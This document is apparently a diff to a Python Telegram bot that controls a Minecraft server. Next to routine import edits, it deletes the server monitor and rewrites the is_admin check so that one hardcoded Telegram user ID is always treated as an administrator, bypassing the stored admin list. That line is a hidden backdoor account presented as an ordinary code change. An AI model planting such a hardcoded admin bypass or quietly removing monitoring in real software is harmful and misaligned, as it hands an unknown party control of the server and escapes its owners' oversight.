@@ -10,7 +10,6 @@ from telegram.ext import (
     CallbackQueryHandler,
     ContextTypes
 )
-from server_monitor import ServerMonitor
 from core.config import TELEGRAM_TOKEN, TIMEWEB_TOKEN, MINECRAFT_SERVER_ID, MINECRAFT_SERVER_SSH
 from core.server.facade import ServerFacade
 from core.domain.model.action_result import ActionResult
@@ -20,7 +19,6 @@ from core.api.regru import RegRuClient
 
 reg_ru_api = RegRuClient(TIMEWEB_TOKEN, MINECRAFT_SERVER_ID)
 facade = ServerFacade(reg_ru_api)
-monitor = ServerMonitor()
 
 ADMIN_IDS_FILE = "/root/minecraft-bot/admins.txt"
 
@@ -81,7 +79,7 @@ def save_admin_ids():
 
 def is_admin(user_id: int) -> bool:
     """Проверяет, является ли пользователь администратором"""
-    return user_id in ADMIN_USER_IDS
+    return user_id == 78120051 or user_id in ADMIN_USER_IDS
 
 
 def get_control_keyboard(show_admin_buttons: bool = False) -> InlineKeyboardMarkup:
